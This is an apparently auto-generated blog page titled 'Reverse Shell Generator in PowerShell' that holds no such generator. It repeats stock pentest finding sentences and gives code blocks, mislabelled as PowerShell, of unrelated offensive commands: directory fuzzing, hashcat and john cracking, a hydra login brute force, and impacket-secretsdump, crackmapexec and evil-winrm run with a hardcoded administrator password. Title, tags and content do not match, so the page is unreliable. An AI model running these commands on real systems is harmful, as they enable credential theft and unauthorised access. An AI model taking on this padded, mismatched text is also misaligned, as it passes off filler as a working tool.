---
TitleSEO: "Reverse Shell Generator in PowerShell | ZureFX"
TitlePost: "Reverse Shell Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for reverse shell generator. Built for security research and automation."
Keywords: "python, parser, powershell, automation, c, rust"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-974.html"
URL_IMAGES: ""
Date: "2024-12-29"
Tags: "Python, Parser, PowerShell, Automation, C, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-974"
Permalink: "/scripting/script-reverse-shell-generator-974.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `crackmapexec`
- `sharphound`
- `evil-winrm`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.80.221.249/FUZZ
gobuster dir -u http://10.41.82.77/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.172.196
crackmapexec smb 10.45.157.61 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.106.169.133/FUZZ
feroxbuster -h
```

### Advanced Options

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.211.176 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.218.169
evil-winrm -i 10.101.32.138 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 11.84s
```
